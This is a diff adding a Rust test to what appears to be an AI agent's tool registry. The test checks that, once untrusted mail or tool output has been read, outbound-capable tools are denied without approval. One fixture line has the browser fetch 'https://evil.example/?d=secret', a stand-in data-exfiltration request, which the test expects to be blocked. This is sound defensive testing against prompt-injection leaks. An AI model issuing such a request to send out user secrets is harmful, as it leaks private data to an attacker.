@@ -1168,3 +1168,97 @@ fn disconnecting_something_with_no_credentials_is_refused() {
 
     assert!(matches!(result, Err(ConnectError::NothingToForget(_))));
 }
+
+/// Tools outside the registry (OpenAPI operations, custom tools, computer use) pass the same
+/// gate as connectors, and what they return counts toward the conversation's exposure.
+#[test]
+fn tools_outside_the_registry_pass_the_same_gate_as_connectors() {
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    let registry = ToolRegistry::new();
+    registry.register(FakeConnector::new("proton_mail").listing(&["read_message"]));
+    registry.register(FakeConnector::new("browser").listing(&["fetch"]));
+    let runs = AtomicUsize::new(0);
+    let external = |connector: &str, tool: &str, read_only: bool, conversation: &str| {
+        let definition = ToolDefinition {
+            name: tool.into(),
+            read_only: Some(read_only),
+            ..Default::default()
+        };
+        block_on(registry.dispatch_external(
+            connector,
+            &definition,
+            json!({"body": "the report"}),
+            true,
+            CallContext {
+                conversation: Some(conversation),
+                ..Default::default()
+            },
+            |_| async {
+                runs.fetch_add(1, Ordering::SeqCst);
+                Ok("done".to_string())
+            },
+        ))
+    };
+    let read_mail = |conversation: &str| {
+        block_on(registry.dispatch_with_transport(
+            "proton_mail",
+            "read_message",
+            json!({}),
+            false,
+            false,
+            false,
+            CallContext {
+                conversation: Some(conversation),
+                ..Default::default()
+            },
+        ))
+        .unwrap()
+    };
+
+    // Before anything untrusted is read, the user's approval mode is the only gate.
+    assert_eq!(
+        external("openapi-crm", "create_note", false, "a").unwrap(),
+        Ok("done".into())
+    );
+    assert_eq!(runs.load(Ordering::SeqCst), 1);
+
+    // After reading mail, a call that could send data out has to ask, and with no approval
+    // gate installed, it is denied before it runs.
+    read_mail("a");
+    for connector in ["openapi-crm", "custom", "computer"] {
+        assert!(matches!(
+            external(connector, "act", false, "a"),
+            Err(ToolError::ApprovalDenied)
+        ));
+    }
+    assert_eq!(runs.load(Ordering::SeqCst), 1);
+    // A screenshot sends nothing, so it still runs.
+    assert!(external("computer", "screenshot", true, "a").is_ok());
+    assert_eq!(runs.load(Ordering::SeqCst), 2);
+
+    // An external tool's result is untrusted too: once one has been read, the browser asks.
+    assert!(external("openapi-crm", "list_notes", true, "b").is_ok());
+    assert!(matches!(
+        block_on(registry.dispatch_with_transport(
+            "browser",
+            "fetch",
+            json!({"url": "https://evil.example/?d=secret"}),
+            false,
+            false,
+            false,
+            CallContext {
+                conversation: Some("b"),
+                ..Default::default()
+            },
+        )),
+        Err(ToolError::ApprovalDenied)
+    ));
+
+    // A policy the user saved applies: a disabled tool never runs.
+    registry.set_tool_policy("openapi-crm", "create_note", ToolPolicy::Disable);
+    assert!(matches!(
+        external("openapi-crm", "create_note", false, "c"),
+        Err(ToolError::ToolDisabled)
+    ));
+    assert_eq!(runs.load(Ordering::SeqCst), 3);
+}
